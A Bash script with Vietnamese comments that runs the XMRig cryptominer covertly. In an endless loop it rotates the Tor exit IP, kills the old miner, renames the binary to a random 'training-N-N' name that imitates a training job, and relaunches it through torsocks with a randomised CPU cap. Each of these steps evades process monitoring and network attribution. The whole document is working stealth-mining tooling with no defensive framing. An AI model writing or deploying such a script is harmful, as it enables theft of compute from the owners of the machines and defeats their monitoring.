#!/bin/bash

while true; do
    # Chờ trong khoảng thời gian ngẫu nhiên từ 5 đến 10 phút
    sleep $((RANDOM % 300 + 300))

    echo "Đang yêu cầu Tor thay đổi IP..."
    kill -HUP $(pgrep tor)
    echo "Tor đã thay đổi IP."

    # Kiểm tra và dừng XMRig với tên cũ
    if [ -f /root/xmrig_name.txt ]; then
        echo "Dừng XMRig với tên cũ..."
        xmrig_name=$(cat /root/xmrig_name.txt)
        pkill -f $xmrig_name
        rm -f /root/xmrig_name.txt
        sleep 5
    fi

    # Kiểm tra file XMRig có tồn tại hay không trước khi đổi tên
    if [ ! -f $WORK_DIR/xmrig-${VERSION}/xmrig ]; then
        echo "XMRig không tồn tại tại $WORK_DIR/xmrig-${VERSION}/xmrig. Kiểm tra quá trình cài đặt."
        exit 1
    fi

    # Tạo tên mới cho XMRig và chạy lại
    echo "Tạo tên mới cho XMRig..."
    RANDOM_NAME=$(echo training-$(shuf -i 1-375 -n 1)-$(shuf -i 1-259 -n 1))
    mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/$RANDOM_NAME
    chmod +x $WORK_DIR/$RANDOM_NAME
    echo $RANDOM_NAME > /root/xmrig_name.txt

    echo "Chạy lại XMRig với tên mới $RANDOM_NAME..."
    cpu_hint=$(shuf -i 70-90 -n 1)
    torsocks $WORK_DIR/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages -k --tls --cpu-max-threads-hint=$cpu_hint &
done
